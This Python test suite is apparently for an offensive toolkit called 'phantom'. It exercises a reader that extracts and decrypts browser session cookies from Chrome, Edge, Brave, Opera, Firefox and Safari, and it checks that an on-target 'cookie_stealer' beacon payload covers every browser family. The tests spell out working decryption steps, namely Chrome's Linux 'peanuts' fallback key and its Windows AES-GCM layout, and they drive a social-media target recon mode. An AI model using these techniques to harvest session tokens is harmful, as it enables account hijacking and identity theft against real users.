"""Tests: local cookie reader (no beacon) + start-gate CLI.

* the reader touches only %LOCALAPPDATA% files (sqlite copy, DPAPI),
  imports nothing network-capable, never raises;
* plaintext cookie rows parse; missing browser -> [];
* CLI start-gate previews + confirms before launch.
"""
import json
import os
import sqlite3
import unittest


def _chrome_tree(root, cookies=()):
    from pathlib import Path
    prof = Path(root) / "Google" / "Chrome" / "User Data" / "Default"
    prof.mkdir(parents=True, exist_ok=True)
    (Path(root) / "Google" / "Chrome" / "User Data" / "Local State"
     ).write_text(json.dumps({"os_crypt": {}}), encoding="utf-8")
    db = prof / "Cookies"
    con = sqlite3.connect(str(db))
    con.execute("CREATE TABLE cookies (host_key TEXT, name TEXT, "
                "path TEXT, value TEXT, encrypted_value BLOB)")
    for host, name, path, value in cookies:
        con.execute("INSERT INTO cookies VALUES (?,?,?,?,?)",
                    (host, name, path, value, b""))
    con.commit()
    con.close()
    return root


class TestLocalReader(unittest.TestCase):
    def test_plaintext_rows_parse(self):
        import tempfile
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        tmp = tempfile.mkdtemp(prefix="phantom-cookie-test-")
        _chrome_tree(tmp, [(".instagram.com", "sessionid", "/", "abc"),
                           (".tiktok.com", "sid", "/", "xyz")])
        try:
            # platform= pinned so the layout asserted here is the Windows one
            # on EVERY runner (a test that only passes on the box it was
            # written on is a test that hides the next regression).
            entries = read_browser_cookies(base_dir=tmp, platform="windows")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)
        by_host = {e["host"]: e for e in entries}
        self.assertEqual(by_host[".instagram.com"]["value"], "abc")
        self.assertEqual(by_host[".tiktok.com"]["name"], "sid")

    def test_domain_filter(self):
        import tempfile
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        tmp = tempfile.mkdtemp(prefix="phantom-cookie-test-")
        _chrome_tree(tmp, [(".instagram.com", "a", "/", "1"),
                           (".x.com", "b", "/", "2")])
        try:
            entries = read_browser_cookies(
                base_dir=tmp, domains=["instagram.com"], platform="windows")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["host"], ".instagram.com")

    def test_missing_browser_gives_empty(self):
        import tempfile
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        tmp = tempfile.mkdtemp(prefix="phantom-cookie-test-")
        try:
            self.assertEqual(
                read_browser_cookies(base_dir=tmp, platform="windows"), [])
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_empty_root_gives_empty_on_every_platform(self):
        """The reader is no longer Windows-only: an empty tree simply has no
        browsers to read, whichever platform is asked about."""
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        for platform in ("windows", "linux", "macos"):
            self.assertEqual(
                read_browser_cookies(base_dir="whatever", platform=platform),
                [])

    def test_no_network_imports(self):
        import pathlib
        src = pathlib.Path(
            "phantom/automation/social/local_cookies.py").read_text(
                encoding="utf-8")
        for mod in ("socket", "requests", "urllib", "http.client",
                    "subprocess", "os.system", "os.popen"):
            self.assertNotIn(f"import {mod}", src)
            self.assertNotIn(f"from {mod}", src)


def _prof(root, sub=("Default",)):
    from pathlib import Path
    path = Path(root).joinpath(*sub)
    path.mkdir(parents=True, exist_ok=True)
    return path


def _chromium_db(path, rows, table="cookies"):
    """rows: (host_key, name, path, value, encrypted_value)"""
    con = sqlite3.connect(str(path))
    con.execute(f"CREATE TABLE {table} (host_key TEXT, name TEXT, "
                f"path TEXT, value TEXT, encrypted_value BLOB, "
                f"expires_utc INTEGER)")
    con.executemany(f"INSERT INTO {table} VALUES (?,?,?,?,?,0)", rows)
    con.commit()
    con.close()


def _gecko_db(path, rows):
    """rows: (host, name, path, value) — cookies.sqlite holds PLAINTEXT."""
    con = sqlite3.connect(str(path))
    con.execute("CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, "
                "originAttributes TEXT, name TEXT, value TEXT, host TEXT, "
                "path TEXT, expiry INTEGER)")
    con.executemany("INSERT INTO moz_cookies "
                    "(host, name, path, value, originAttributes, expiry) "
                    "VALUES (?,?,?,?,'',0)", rows)
    con.commit()
    con.close()


def _binarycookies_file(entries):
    """Build a real Cookies.binarycookies image (big-endian, page 0)."""
    import struct

    def record(host, name, path, value):
        strings = [(b"https://" + host.encode()) + b"\x00",
                   name.encode() + b"\x00",
                   (path or "/").encode() + b"\x00",
                   value.encode() + b"\x00"]
        offsets, cursor = [], 56
        for chunk in strings:
            offsets.append(cursor)
            cursor += len(chunk)
        body = b"".join(strings)
        head = (cursor.to_bytes(4, "little")            # size
                + (0).to_bytes(4, "little")             # version
                + (1).to_bytes(4, "little")             # flags
                + (0).to_bytes(4, "little")             # has_port
                + b"".join(o.to_bytes(4, "little") for o in offsets)
                + struct.pack("<d", 0.0) + struct.pack("<d", 0.0)
                # port + comment offset: the strings start at 56, like Safari's
                + (0).to_bytes(4, "little") + (0).to_bytes(4, "little"))
        return head + body

    records = [record(*entry) for entry in entries]
    page = (b"\x00\x00\x00\x00" + len(records).to_bytes(4, "little")
            + b"".join((8 + 4 * len(records)
                        + sum(len(r) for r in records[:i])).to_bytes(
                            4, "little") for i in range(len(records)))
            + b"".join(records))
    return (b"cookies\x00" + (1).to_bytes(4, "big")
            + len(page).to_bytes(4, "big") + page)


class TestEveryBrowser(unittest.TestCase):
    """One reader, every family, every platform."""

    def _run(self, platform, home="", base_dir="", **kw):
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        return read_browser_cookies(platform=platform, home=home,
                                    base_dir=base_dir, **kw)

    def test_firefox_is_read_on_linux_without_any_decryption(self):
        import tempfile
        tmp = tempfile.mkdtemp(prefix="phantom-ff-")
        try:
            profile = _prof(tmp, (".mozilla", "firefox", "abc.default-release"))
            _gecko_db(profile / "cookies.sqlite",
                      [(".instagram.com", "sessionid", "/", "ff-secret")])
            entries = self._run("linux", home=tmp)
            self.assertEqual(len(entries), 1)
            self.assertEqual(entries[0]["value"], "ff-secret")
            self.assertEqual(entries[0]["browser"], "firefox")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_firefox_is_read_on_windows_and_macos(self):
        import tempfile
        for platform, sub in (("windows", ("Mozilla", "Firefox", "Profiles",
                                           "xyz.default")),
                              ("macos", ("Library", "Application Support",
                                         "Firefox", "Profiles",
                                         "xyz.default"))):
            tmp = tempfile.mkdtemp(prefix="phantom-ff-")
            try:
                profile = _prof(tmp, sub)
                _gecko_db(profile / "cookies.sqlite",
                          [(".tiktok.com", "sid", "/", "ff-" + platform)])
                entries = self._run(platform, home=tmp,
                                    base_dir=(tmp if platform == "windows"
                                              else ""))
                self.assertEqual([e["value"] for e in entries],
                                 ["ff-" + platform], platform)
            finally:
                import shutil
                shutil.rmtree(tmp, ignore_errors=True)

    def test_every_chromium_browser_and_profile_is_read(self):
        import tempfile
        from pathlib import Path
        tmp = tempfile.mkdtemp(prefix="phantom-chr-")
        try:
            from phantom.automation.social.local_cookies import (
                read_browser_cookies)
            for vendor, product, host in (
                    ("Google", "Chrome", ".instagram.com"),
                    ("Microsoft", "Edge", ".office.com"),
                    ("BraveSoftware", "Brave-Browser", ".brave.com")):
                profile = _prof(tmp, (vendor, product, "User Data", "Default"))
                (profile / "Network").mkdir(parents=True, exist_ok=True)
                _chromium_db(profile / "Network" / "Cookies",
                             [(host, "sid", "/", vendor, b"")])
            second = _prof(tmp, ("Google", "Chrome", "User Data", "Profile 1"))
            (second / "Network").mkdir(parents=True, exist_ok=True)
            _chromium_db(second / "Network" / "Cookies",
                         [(".x.com", "sid", "/", "p1", b"")])
            (Path(tmp) / "Google" / "Chrome" / "User Data" / "Local State"
             ).write_text(json.dumps({"os_crypt": {}}), encoding="utf-8")

            entries = read_browser_cookies(base_dir=tmp, platform="windows")
            by_value = {e["value"]: e for e in entries}
            self.assertEqual(len(entries), 4)
            self.assertEqual(by_value["Google"]["browser"], "chrome")
            self.assertEqual(by_value["Microsoft"]["browser"], "edge")
            self.assertEqual(by_value["BraveSoftware"]["browser"], "brave")
            self.assertEqual(by_value["p1"]["profile"], "Profile 1")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_opera_roaming_layout_is_read(self):
        import tempfile
        tmp = tempfile.mkdtemp(prefix="phantom-opera-")
        try:
            profile = _prof(tmp, ("Opera Software", "Opera Stable"))
            (profile / "Network").mkdir(parents=True, exist_ok=True)
            _chromium_db(profile / "Network" / "Cookies",
                         [(".opera.com", "sid", "/", "op", b"")])
            entries = self._run("windows", base_dir=tmp)
            self.assertEqual([e["value"] for e in entries], ["op"])
            self.assertEqual(entries[0]["browser"], "opera")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_safari_binarycookies_are_parsed(self):
        import tempfile
        from pathlib import Path
        tmp = tempfile.mkdtemp(prefix="phantom-safari-")
        try:
            cookies_dir = Path(tmp) / "Library" / "Cookies"
            cookies_dir.mkdir(parents=True, exist_ok=True)
            (cookies_dir / "Cookies.binarycookies").write_bytes(
                _binarycookies_file([(".instagram.com", "sessionid", "/",
                                      "safari-secret"),
                                     ("www.tiktok.com", "sid", "/x", "t2")]))
            entries = self._run("macos", home=tmp)
            self.assertEqual(sorted(e["value"] for e in entries),
                             ["safari-secret", "t2"])
            self.assertTrue(all(e["browser"] == "safari" for e in entries))
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_linux_chromium_v10_cbc_is_decrypted_with_the_default_key(self):
        """With no keyring in reach, Chrome falls back to PBKDF2("peanuts")."""
        import tempfile
        import hashlib
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        tmp = tempfile.mkdtemp(prefix="phantom-linux-chr-")
        try:
            profile = _prof(tmp, (".config", "google-chrome", "Default"))
            (profile / "Network").mkdir(parents=True, exist_ok=True)
            key = hashlib.pbkdf2_hmac("sha1", b"peanuts", b"saltysalt", 1, 16)
            plain = b"linux-secret"
            pad = 16 - (len(plain) % 16)
            encryptor = Cipher(algorithms.AES(key),
                               modes.CBC(b"\x20" * 16)).encryptor()
            blob = encryptor.update(plain + bytes([pad]) * pad)
            blob += encryptor.finalize()
            _chromium_db(profile / "Network" / "Cookies",
                         [(".instagram.com", "sessionid", "/", "",
                           b"v10" + blob)])
            entries = self._run("linux", home=tmp)
            self.assertEqual([e["value"] for e in entries], ["linux-secret"])
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_windows_chromium_v10_gcm_is_decrypted_with_the_master_key(self):
        import tempfile
        from unittest.mock import patch
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        tmp = tempfile.mkdtemp(prefix="phantom-win-chr-")
        try:
            profile = _prof(tmp, ("Google", "Chrome", "User Data", "Default"))
            (profile / "Network").mkdir(parents=True, exist_ok=True)
            master = bytes(range(32))
            # Chrome's modern layout: b"v10" || 12-byte nonce || ct || tag
            nonce = bytes(range(12))
            blob = b"v10" + nonce + AESGCM(master).encrypt(
                nonce, b"win-secret", None)
            _chromium_db(profile / "Network" / "Cookies",
                         [(".instagram.com", "sessionid", "/", "", blob)])
            with patch("phantom.automation.social.local_cookies._master_key",
                       return_value=master):
                entries = self._run("windows", base_dir=tmp)
            self.assertEqual([e["value"] for e in entries], ["win-secret"])
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_app_bound_values_are_reported_not_faked(self):
        import tempfile
        from phantom.automation.social.local_cookies import (
            read_browser_cookies)
        tmp = tempfile.mkdtemp(prefix="phantom-v20-")
        try:
            profile = _prof(tmp, ("Google", "Chrome", "User Data", "Default"))
            (profile / "Network").mkdir(parents=True, exist_ok=True)
            _chromium_db(profile / "Network" / "Cookies",
                         [(".instagram.com", "sessionid", "/", "",
                           b"v20" + b"\x00" * 40)])
            diagnostics = {}
            entries = read_browser_cookies(base_dir=tmp, platform="windows",
                                           diagnostics=diagnostics)
            self.assertEqual(entries, [])
            self.assertEqual(diagnostics.get("app-bound (v20)"), 1)
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_sealed_values_are_surfaced_in_the_summary(self):
        import tempfile
        from unittest.mock import patch
        from phantom.automation.social.local_cookies import (
            collect_local_session)
        tmp = tempfile.mkdtemp(prefix="phantom-sealed-")
        try:
            profile = _prof(tmp, ("Google", "Chrome", "User Data", "Default"))
            (profile / "Network").mkdir(parents=True, exist_ok=True)
            _chromium_db(profile / "Network" / "Cookies",
                         [(".x.com", "sid", "/", "", b"v20" + b"\x00" * 40)])
            with patch.dict(os.environ, {"LOCALAPPDATA": tmp,
                                        "APPDATA": tmp}, clear=False), \
                    patch("phantom.automation.social.local_cookies._platform",
                          return_value="windows"):
                ok, lines = collect_local_session()
            self.assertFalse(ok)
            # A sealed value is NAMED in the reason: an empty result that does
            # not say why is how an operator concludes "no cookies here".
            self.assertIn("app-bound", lines[0])
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)


class TestBeaconCookieCoverage(unittest.TestCase):
    """The ON-TARGET stealer must cover the same browsers as this reader.

    The C++ header is the other half of the same promise ("every browser,
    every platform"); a refactor that drops Gecko or Safari would otherwise
    only show up on an engagement.
    """

    def _header(self) -> str:
        import pathlib
        return pathlib.Path(
            "phantom/payloads/beacon/src/cookie_stealer.h").read_text(
                encoding="utf-8")

    def test_covers_every_family(self):
        header = self._header()
        self.assertIn("moz_cookies", header)        # Firefox / Gecko
        self.assertIn("Cookies.binarycookies", header)  # Safari
        self.assertIn("read_table", header)          # schema-aware engine
        for browser in ("Google", "Microsoft", "BraveSoftware", "Chromium",
                        "Vivaldi", "Opera Software"):
            self.assertIn(browser, header, browser)
        for folder in ("google-chrome", "brave-browser", "microsoft-edge",
                       "vivaldi"):
            self.assertIn(folder, header, folder)

    def test_sealed_values_are_named_not_faked(self):
        header = self._header()
        # App-Bound Encryption and a missing keystore must be REPORTED.
        self.assertIn("app-bound (v20)", header)
        self.assertIn("sealed_reason", header)

    def test_linux_oscrypt_is_capability_gated_so_the_build_never_breaks(self):
        header = self._header()
        self.assertIn("__has_include(<openssl/evp.h>)", header)
        self.assertIn("PHANTOM_COOKIE_HAVE_OPENSSL", header)
        self.assertIn("peanuts", header)


class TestCliStartGate(unittest.TestCase):
    def _shell(self):
        from unittest.mock import Mock
        shell = Mock()
        shell.auto_run = False
        return shell

    def _run_gate(self, user_input):
        from phantom.core.shell.commands import auto as auto_mod
        from phantom.core.session import session
        from unittest.mock import Mock, patch
        old_target = session.target
        shell = self._shell()
        prof = Mock()
        prof.username = "u"
        prof.platform = "instagram"
        try:
            with patch("sys.stdin.isatty", return_value=True), \
                    patch("sys.stdout.isatty", return_value=True), \
                    patch("phantom.automation.guidance.targets.classify_target",
                          return_value="username"), \
                    patch("phantom.automation.social.recon.preview_profile",
                          return_value=prof), \
                    patch("phantom.automation.social.recon.present_candidate",
                          return_value="@u"), \
                    patch("builtins.input", return_value=user_input), \
                    patch("phantom.core.automode.run_auto_mode") as m_run:
                auto_mod.cmd_auto(
                    shell, "someuser --platform instagram --goal identity")
            return m_run
        finally:
            session.target = old_target

    def test_cancel_on_wrong_profile(self):
        m_run = self._run_gate("n")
        m_run.assert_not_called()

    def test_proceed_on_confirm(self):
        m_run = self._run_gate("")
        self.assertTrue(m_run.called)


if __name__ == "__main__":
    unittest.main()
